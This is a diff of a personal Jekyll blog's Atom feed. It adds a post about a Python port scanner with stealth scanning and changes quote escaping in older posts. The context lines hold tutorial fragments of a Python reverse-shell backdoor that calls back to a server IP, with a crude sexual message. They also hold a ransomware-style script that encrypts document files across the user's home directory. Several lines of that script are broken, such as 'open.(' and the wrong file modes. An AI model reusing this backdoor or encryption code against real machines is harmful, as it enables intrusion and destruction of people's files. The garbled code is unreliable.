@@ -1,4 +1,34 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-03T23:30:32+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">Thoughts on React.js</title><link href="http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js.html" rel="alternate" type="text/html" title="Thoughts on React.js" /><published>2020-10-03T06:00:00+08:00</published><updated>2020-10-03T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js</id><content type="html" xml:base="http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js.html">&lt;h1 id=&quot;for-starters&quot;&gt;For starters&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-10T19:55:20+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">Port Scanning Tool: finding-PORTy</title><link href="http://localhost:4000/coding/2021/06/10/Port-scanning-tool.html" rel="alternate" type="text/html" title="Port Scanning Tool: finding-PORTy" /><published>2021-06-10T06:00:00+08:00</published><updated>2021-06-10T06:00:00+08:00</updated><id>http://localhost:4000/coding/2021/06/10/Port-scanning-tool</id><content type="html" xml:base="http://localhost:4000/coding/2021/06/10/Port-scanning-tool.html">&lt;h1 id=&quot;what-is-it&quot;&gt;What is it?&lt;/h1&gt;
+&lt;p&gt;finding-PORTy is a proof of concept fully functional port scanning tool designed to check open ports, check live host in a network, stealth scans, and keep activity data for later use. I wrote it on Python 3 so the codebase is supposed to be easily understandable and modified for further use.&lt;/p&gt;
+
+&lt;p&gt;here’s what it looks like&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   o
+    |  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   o
+|&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/    .&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;o
+| |       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;======[&lt;/span&gt;finding-PORTy v1.]&lt;span class=&quot;o&quot;&gt;======&lt;/span&gt;
+|/ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;    /
+    |  /
+     |/
+                    
+
+
+&lt;span class=&quot;o&quot;&gt;===[&lt;/span&gt;OPTIONS]&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; 
+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Scan Open Ports 
+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Ping Sweep Live Host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Loud&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] TCP Scan &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Stealth&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] Show Activities 
+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5] Remove History
+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0] Exit
+Action: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;whats-the-souce&quot;&gt;What’s the Souce?&lt;/h1&gt;
+&lt;p&gt;souce: &lt;a href=&quot;https://github.com/AdrianDucao/finding-PORTy&quot;&gt;https://github.com/AdrianDucao/finding-PORTy&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Learning curve is a minor setback with &lt;a href=&quot;https://docs.python.org/3/library/socket.html?highlight=socket#module-socket&quot;&gt;Socket Module&lt;/a&gt;, read Python 3 Documentations &lt;a href=&quot;https://docs.python.org/3/library/os.html?highlight=os#module-os&quot;&gt;OS Documentation&lt;/a&gt;, &lt;a href=&quot;https://docs.python.org/3/library/csv.html?highlight=csv&quot;&gt;CSV documentation&lt;/a&gt;, the &lt;a href=&quot;https://www.tutorialspoint.com/python3/python_networking.htm&quot;&gt;python3 network programming&lt;/a&gt;, and some stack overflow for errors really helped.&lt;/p&gt;
+
+&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">What is it? finding-PORTy is a proof of concept fully functional port scanning tool designed to check open ports, check live host in a network, stealth scans, and keep activity data for later use. I wrote it on Python 3 so the codebase is supposed to be easily understandable and modified for further use.</summary></entry><entry><title type="html">Thoughts on React.js</title><link href="http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js-copy.html" rel="alternate" type="text/html" title="Thoughts on React.js" /><published>2020-10-03T06:00:00+08:00</published><updated>2020-10-03T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js%20copy</id><content type="html" xml:base="http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js-copy.html">&lt;h1 id=&quot;for-starters&quot;&gt;For starters&lt;/h1&gt;
 &lt;p&gt;React.js is a javascript library for building front-end UI and components, it’s mainly used by front-end developers and full stack developers for static sites, web apps, and mobile apps. The competition is mainly Angular and Vue.js on web and mobile framework.&lt;/p&gt;
 
 &lt;p&gt;I tried using the react and experiment with it last early months of 2020 but I’ve decided to take a look at it last September of 2020 to better understand the framework, I did quite a lot of googling and watched youtube videos to understand the basics of the syntax, there’s no easy way to learn a framework but to read the documentation and from there i understand that you are still using some HTML tags, using CSS to design stuff, and still using the normal JavaScript, so basically your generating a static HTML file with javascript.&lt;/p&gt;
@@ -29,13 +59,13 @@ src directory - contains the source file, components, and pages of your static s
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    npm i sessionstorage-for-nodejs
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;usage:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-nodejs&quot;&gt;    const sessionStorage = require('sessionstorage-for-node');
+&lt;pre&gt;&lt;code class=&quot;language-nodejs&quot;&gt;    const sessionStorage = require(&apos;sessionstorage-for-node&apos;);
     
-    sessionStorage.setItem('id', 'value');
+    sessionStorage.setItem(&apos;id&apos;, &apos;value&apos;);
     
-    console.log('product: ', sessionStorage.getItem('foo'));
+    console.log(&apos;product: &apos;, sessionStorage.getItem(&apos;foo&apos;));
     
-    sessionStorage.removeItem('id', 'value');
+    sessionStorage.removeItem(&apos;id&apos;, &apos;value&apos;);
 
 &lt;/code&gt;&lt;/pre&gt;
 
@@ -73,21 +103,21 @@ src directory - contains the source file, components, and pages of your static s
 &lt;span class=&quot;c1&quot;&gt;#import socket API module
 &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
 
-&lt;span class=&quot;c1&quot;&gt;# for LAN you can use your pc's ip.
-# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc's ip address.
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'192.168.1.1'&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# for LAN you can use your pc&apos;s ip.
+# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc&apos;s ip address.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;192.168.1.1&apos;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Server is online'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Listening for callback'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Server is online&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Listening for callback&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;#listening for callback
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;#will display once callback is initiated
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f'[+] &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; She spreads the legs, it is time'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;[+] &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; She spreads the legs, it is time&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -99,8 +129,8 @@ src directory - contains the source file, components, and pages of your static s
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
 
 
-&lt;span class=&quot;c1&quot;&gt;#don't forget to set the correct server ip address and port in order for this to callback home.
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'192.168.1.1'&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#don&apos;t forget to set the correct server ip address and port in order for this to callback home.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;192.168.1.1&apos;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
@@ -153,7 +183,7 @@ src directory - contains the source file, components, and pages of your static s
   8 
   9         self.key = None
  10         self.cryptor = None
- 11         self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']
+ 11         self.file_ext_targets = [&apos;pdf&apos;,&apos;doc&apos;,&apos;docx&apos;,&apos;ppt&apos;,&apos;pptx&apos;,&apos;txt&apos;]
  12 
  13     def generateKey(self):
  14 
@@ -165,7 +195,7 @@ src directory - contains the source file, components, and pages of your static s
 &lt;h3 id=&quot;write-a-key-file&quot;&gt;write a key file&lt;/h3&gt;
 &lt;p&gt;now lets create a function to write the key to a file&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 23     def writeKey(self, key_filename):
- 24         with open.(key_filename, 'b') as f:
+ 24         with open.(key_filename, &apos;b&apos;) as f:
  25             f.write(self.key)
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -173,7 +203,7 @@ src directory - contains the source file, components, and pages of your static s
 &lt;h3 id=&quot;read-a-key-file&quot;&gt;read a key file&lt;/h3&gt;
 &lt;p&gt;moving on, create a function to read a key from a file&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 18     def readKey(self, key_filename):
- 19         with open(key_filename, 'a') as f:
+ 19         with open(key_filename, &apos;a&apos;) as f:
  20             self.key = f.read()
  21             self.cryptor = Fernet(self.key)
 
@@ -186,7 +216,7 @@ src directory - contains the source file, components, and pages of your static s
  30             for f in files:
  31                 abs_file_path = os.path.join(root, f)
  32 
- 33                 if not abs_file_path('.')[-1] in self.file_ext_targets:
+ 33                 if not abs_file_path(&apos;.&apos;)[-1] in self.file_ext_targets:
  34                     continue
  35 
  36                 self.crypt_file(abs_file_path, encrypted = encrypted)
@@ -196,7 +226,7 @@ src directory - contains the source file, components, and pages of your static s
 &lt;h3 id=&quot;encrypt-the-target-files&quot;&gt;encrypt the target files&lt;/h3&gt;
 &lt;p&gt;function to encrypt the specified filename extensions and check if that file has been encrypted or not&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 38     def encryptFile(self, file_path, encrypted = False):
- 39         with open(file_path, 'a+') as f:
+ 39         with open(file_path, &apos;a+&apos;) as f:
  40             _data = f.read()
  41 
  42             if not encrypted:
@@ -211,17 +241,17 @@ src directory - contains the source file, components, and pages of your static s
 
 &lt;h3 id=&quot;create-a-cli-interface&quot;&gt;create a cli interface&lt;/h3&gt;
 &lt;p&gt;how it works is that you call the class we created earlier and create a conditional statement where you can specify and action you want to take e.g. encrypt or decrypt files.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 51 if __name__ == '__main__':
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 51 if __name__ == &apos;__main__&apos;:
  52     #all directory
- 53     sys_root = expanduser('~')
+ 53     sys_root = expanduser(&apos;~&apos;)
  54 
  55     #specific target directory
- 56     #local_root= '.'
+ 56     #local_root= &apos;.&apos;
  57 
  58     import argparse
  59     parser = argparse.ArgumentParser()
- 60     parser.add_argument('--action', required=True)
- 61     parser.add_argument('--keyfile')
+ 60     parser.add_argument(&apos;--action&apos;, required=True)
+ 61     parser.add_argument(&apos;--keyfile&apos;)
  62 
  63 
  64     args = parser.parse_args()
@@ -230,15 +260,15 @@ src directory - contains the source file, components, and pages of your static s
  67 
  68     lock = Encrypt()
  69 
- 70     if action == 'decrypt':
+ 70     if action == &apos;decrypt&apos;:
  71         if keyfile is None:
- 72             print('Specify path to keyfile after --keyfile')
+ 72             print(&apos;Specify path to keyfile after --keyfile&apos;)
  73         else:
  74             lock.read_key(keyfile)
  75             lock.mainCrypt(local_root, encrypted=True)
- 76     elif action == 'encrypt':
+ 76     elif action == &apos;encrypt&apos;:
  77         lock.generate_key()
- 78         lock.write_key('keyfile')
+ 78         lock.write_key(&apos;keyfile&apos;)
  79         lock.mainCrypt(sys_root)
 
 
@@ -295,8 +325,8 @@ $ python3 crypt.py --action decrypt --keyfile /path/keyfile
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
  --&gt;
 
 &lt;!-- Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
